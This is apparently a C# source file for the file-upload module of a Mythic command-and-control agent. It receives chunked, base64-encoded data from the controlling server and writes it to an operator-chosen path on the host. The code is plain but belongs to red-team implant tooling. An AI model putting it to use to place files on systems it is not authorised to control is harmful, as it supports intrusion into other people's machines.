using Agent.Interfaces;

using Agent.Models;
using Agent.Utilities;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.Text.Json;
using upload;

namespace Agent
{
    public class Plugin : IFilePlugin
    {
        public string Name => "upload";
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ITokenManager tokenManager { get; set; }
        private IAgentConfig config { get; set; }
        private ConcurrentDictionary<string, ServerUploadJob> uploadJobs { get; set; }
        private Dictionary<string, FileStream> _streams { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.logger = logger;
            this.tokenManager = tokenManager;
            this.uploadJobs = new ConcurrentDictionary<string, ServerUploadJob>();
            this._streams = new Dictionary<string, FileStream>();
            this.config = config;
        }

        public async Task Execute(ServerJob job)
        {
            UploadArgs args = JsonSerializer.Deserialize<UploadArgs>(job.task.parameters);
            string message = string.Empty;
            if (args is null || !args.Validate(out message))
            {
                await messageManager.AddResponse(new DownloadTaskResponse
                {
                    status = "error",
                    process_response = new Dictionary<string, string> { { "message", message } },
                    completed = true,
                    task_id = job.task.id
                }.ToJson());
                return;
            }

            //Create our upload job object
            ServerUploadJob uploadJob = new ServerUploadJob(job, this.config.chunk_size)
            {
                path = args.path,
                file_id = args.file,
                task = job.task,
                chunk_num = 1,
            };

            //Add job to our tracker
            if(!uploadJobs.TryAdd(job.task.id, uploadJob))
            {
                await messageManager.AddResponse(new DownloadTaskResponse
                {
                    status = "error",
                    user_output = "failed to add job to tracker",
                    completed = true,
                    task_id = job.task.id
                }.ToJson());
                return;
            }

            //Create the file stream for the upload
            try
            {
                _streams.Add(job.task.id, new FileStream(uploadJob.path, FileMode.Append));
            }
            catch (Exception e)
            {
                //Something went wrong and we can't upload here, inform the user
                await messageManager.AddResponse(new TaskResponse
                {
                    status = "error",
                    completed = true,
                    task_id = job.task.id,
                    user_output = e.ToString(),
                }.ToJson());
                this.CompleteUploadJob(job.task.id);
                return;
            }

            //Officially kick off file upload with Mythic
            await messageManager.AddResponse(new UploadTaskResponse
            {
                task_id = job.task.id,
                upload = new UploadTaskResponseData
                {
                    chunk_size = uploadJob.chunk_size,
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    full_path = uploadJob.path,
                }
            }.ToJson());
        }

        public async Task HandleNextMessage(ServerResponseResult response)
        {
            ServerUploadJob uploadJob = this.GetJob(response.task_id);

            //Did we get an upload job
            if (uploadJob == null)
            {
                await AddErrorResponse(response.task_id, "Failed to get job", true);
                return;
            }

            if (uploadJob.cancellationtokensource.IsCancellationRequested)
            {
                await AddErrorResponse(response.task_id, "Cancellation Requested", true);
                CompleteUploadJob(response.task_id);
                return;
            }

            if (uploadJob.total_chunks == 0)
            {
                if (response.total_chunks == 0)
                {
                    await AddErrorResponse(response.task_id, "Failed to get number of chunks", true);
                    return;
                }

                uploadJob.total_chunks = response.total_chunks;
            }

            if (string.IsNullOrEmpty(response.chunk_data))
            {
                await AddErrorResponse(response.task_id, "No chunk data received", true);
                return;
            }


            if (!HandleNextChunk(Misc.Base64DecodeToByteArray(response.chunk_data), response.task_id))
            {
                await AddErrorResponse(response.task_id, "Failed to process message.", true);
                CompleteUploadJob(response.task_id);
                return;
            }

            uploadJob.chunk_num++;

            UploadTaskResponse uploadResponse = PrepareResponse(response, uploadJob);

            if (response.chunk_num == uploadJob.total_chunks)
            {
                uploadResponse.completed = true;
                CompleteUploadJob(response.task_id);
            }

            await messageManager.AddResponse(uploadResponse.ToJson());
        }

        /// <summary>
        /// Complete and remove the upload job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the upload job to complete</param>
        private void CompleteUploadJob(string task_id)
        {
            if (uploadJobs.ContainsKey(task_id))
            {
                uploadJobs.Remove(task_id, out _);
            }

            if (_streams.ContainsKey(task_id) && _streams[task_id] is not null)
            {
                _streams[task_id].Close();
                _streams[task_id].Dispose();
                _streams.Remove(task_id);
            }

            this.messageManager.CompleteJob(task_id);
        }

        /// <summary>
        /// Read the next chunk from the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        private bool HandleNextChunk(byte[] bytes, string job_id)
        {
            if (!_streams.ContainsKey(job_id))
            {
                this.messageManager.WriteLine("No stream available.", job_id, true, "error");
                return false;
            }

            try
            {
                _streams[job_id].Write(bytes, 0, bytes.Length);
                return true;
            }
            catch (Exception e)
            {
                this.messageManager.WriteLine(e.ToString(), job_id, true, "error");
                return false;
            }
        }
        /// <summary>
        /// Get a download job by ID
        /// </summary>
        /// <param name="task_id">ID of the download job</param>
        private ServerUploadJob GetJob(string task_id)
        {
            return uploadJobs[task_id];
        }

        private async Task AddErrorResponse(string taskId, string userOutput, bool isCompleted)
        {
            await messageManager.AddResponse(new TaskResponse
            {
                status = "error",
                completed = isCompleted,
                task_id = taskId,
                user_output = userOutput,
            }.ToJson());
        }

        private UploadTaskResponse PrepareResponse(ServerResponseResult response, ServerUploadJob uploadJob)
        {
            var uploadResponse = new UploadTaskResponse()
            {
                task_id = response.task_id,
                status = $"Processed {uploadJob.chunk_num}/{uploadJob.total_chunks}",
                upload = new UploadTaskResponseData
                {
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    chunk_size = uploadJob.chunk_size,
                    full_path = uploadJob.path
                }
            };

            if (response.chunk_num == uploadJob.total_chunks)
            {
                uploadResponse = new UploadTaskResponse()
                {
                    task_id = response.task_id,
                    upload = new UploadTaskResponseData
                    {
                        file_id = uploadJob.file_id,
                        full_path = uploadJob.path,
                    },
                    completed = true
                };
            }

            return uploadResponse;
        }
    }
}
